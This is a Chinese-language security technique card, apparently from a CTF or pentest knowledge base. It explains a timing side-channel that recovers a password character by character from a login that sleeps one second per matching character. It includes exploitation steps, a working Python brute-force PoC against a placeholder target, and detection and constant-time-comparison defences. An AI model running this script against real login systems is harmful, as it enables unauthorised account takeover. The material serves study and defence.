---
id: web-generic-auth-per-char-sleep-timing-password-oracle
title: 逐字符比较 + 匹配即 sleep 的密码校验：响应时延侧信道逐位恢复密码
type: scenario
domain: web
path: web/generic/auth
technique: per-character-sleep-timing-password-oracle
aliases:
- 时序侧信道
- timing attack 密码
- kirbytime
- sleep 盲注
- response time oracle
- 逐字符爆破
- 密码时序泄露
tags:
- timing-attack
- side-channel
- auth
- bruteforce
- flask
- sleep
- response-time
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V279
  verified_at: '2026-11-07T23:15:04+08:00'
  notes: 已对照原文核对：Flask 源码逐字符比较、匹配位 sleep(1)、长度 7 校验及题解逐位时序爆破 PoC 均一致；原文靶机下线，PoC 引自第三方 writeup，未独立运行验证。
---

## 一句话结论

当登录逻辑逐字符比较密码、且每命中一位就 `sleep(1)`、遇到第一位不匹配立即返回时，响应时间等于“匹配前缀长度 × 1 秒 + 固定开销”；攻击者可固定已恢复前缀，逐位枚举字符并测量响应时延，把密码一位一位地恢复出来，而不需要任何报错差异或高并发。

## 原理

- 代码模式：`for i in range(len(password)): if password[i] != real[i]: return error; else: sleep(1)`。比较是短路（early-exit）的：第 k 位不匹配时，前面 k 位都已匹配并各 sleep 1 秒，第 k 位不 sleep；第 k 位匹配才会继续到第 k+1 位。
- 因此响应时延与“输入与真实密码的最长公共前缀长度”近似成正比：猜 `Jaaaaaa` 时若首位 `J` 正确，处理约 1 秒；猜 `Ja...` 且前两位正确，约 2 秒，以此类推。第 k 位正确字符的响应时间比同位置错误字符多约 1 秒。
- 这是一种**时间侧信道（timing side channel）**：不需要错误信息、状态码或响应长度差异，只需要网络时延足够稳定、能区分约 1 秒的差别。
- 前提是密码长度已知（如提示 “you need 7 chars” 或从校验逻辑得知）；字符集可枚举（字母、数字、符号）。
- 与“用户名枚举/锁定时间差”不同：本场景每个密码字符的匹配都会主动 sleep，信号更强，但测量仍受网络抖动、服务端并发和 sleep 精度影响；实际利用常配合多次采样/取中位数/动态阈值。

## 触发条件

- 登录/校验接口对用户输入逐字符比较，匹配时执行固定时间操作（sleep、哈希、远程校验），不匹配时短路返回。
- 攻击者可访问接口并测量响应时间（无严格速率限制，或限制不影响逐位枚举）。
- 密码长度已知或可推断；字符集范围有限。
- 网络时延相对稳定，单次 sleep 时长（如 1 秒）明显大于抖动。

## 利用步骤

1. 确认密码长度：提交不同长度，观察错误提示（如 “you need 7 chars”）或长度校验分支。
2. 准备字符集（`string.ascii_letters + string.digits + 常见符号`），初始化猜测为 `['a'] * length`。
3. 从第 0 位开始：固定前缀，枚举该位字符，提交并测量响应时间；对每个候选做多次采样取中位数/平均值，减少抖动。
4. 动态阈值：第 k 位正确时的期望时间约为 `(k+1) × sleep + 基础开销`，阈值可设为 `1.2 + k × 1.0`（示例）；超过阈值即判定该位字符正确，进入下一位。
5. 全部位恢复后提交完整密码登录；若个别位误判，回溯/扩大采样重试。
6. 若服务端只在校验成功时 sleep、失败不 sleep，或 sleep 在比较后统一执行，则信号消失，需改用其他侧信道。

## PoC

```python
import requests, string, time

url = 'http://target/'
length = 7
charset = string.ascii_letters + string.digits + "!@#$%^&*()-=_+[]{}|;:,.<>/?~"
known = ['a'] * length

def measure(password, samples=3):
    times = []
    for _ in range(samples):
        start = time.time()
        requests.post(url, data={'password': password}, timeout=10)
        times.append(time.time() - start)
    return sorted(times)[len(times) // 2]

for pos in range(length):
    for ch in charset:
        known[pos] = ch
        guess = ''.join(known)
        elapsed = measure(guess)
        threshold = 1.2 + pos * 1.0   # 预期 (pos+1) 秒，留余量
        print(f'pos={pos} char={ch!r} elapsed={elapsed:.2f}s threshold={threshold:.2f}s')
        if elapsed > threshold:
            print(f'[+] position {pos} = {ch!r}')
            break
    else:
        known[pos] = 'a'
        print(f'[-] position {pos} not found')

print('password =', ''.join(known))
```

```text
# 响应时间与公共前缀的关系（示例，sleep=1s）
Guess: aaaaaaa  -> 约 0.0s（首位就错）
Guess: Jaaaaaa  -> 约 1.0s（首位 J 正确）
Guess: Jayaaaa  -> 约 2.0s（前两位 Jay 正确）
...
```

## 变体与关联

- 侧信道变体：不同错误分支的时间差、响应长度/状态码差异、数据库索引/正则匹配时间、哈希计算时间、锁定前的用户名枚举。
- sleep 位置变体：匹配时 sleep、每次比较固定 sleep、失败时也 sleep（信号弱化）；异步/多线程服务会使时间差被并发掩盖。
- 阈值变体：固定阈值、按位置递增阈值、滑动窗口/中位数/机器学习分类；高抖动环境需增加采样次数。
- 关联卡片：[[web-generic-auth-username-enumeration-timing-lockout]]（账号/锁定时间枚举）、[[web-generic-sqli-cartesian-product-time-blind]]（SQL 时间盲注对比）、[[crypto-side-channel-aes-cpa-hamming-weight]]（密码学侧信道）。
- 边界：服务端使用常量时间比较（`hmac.compare_digest`）、全路径等长 sleep、网络噪声过大、速率限制严格或需要验证码时，逐位恢复会失败或成本过高。

## 检测与防御

- 检测：短时间对同一登录接口大量请求且密码仅逐位变化；响应时间呈“前缀长度阶梯”；同一 IP 的请求间隔/字符集模式异常；登录失败率与时间分布异常。
- 修复：使用常量时间比较（如 `hmac.compare_digest`），不要在比较循环中 sleep；对所有失败路径使用统一的固定延迟（而非按匹配位数延迟）；限制密码长度提示等泄漏信息。
- 加固：登录接口速率限制、验证码、账户锁定（注意锁定本身也可能成为枚举侧信道）；监控响应时间分布与逐位枚举模式；高安全场景使用多因素认证。
- 注意：统一随机延迟可增加噪声，但不能替代常量时间比较；最好的做法是让比较耗时与输入无关。
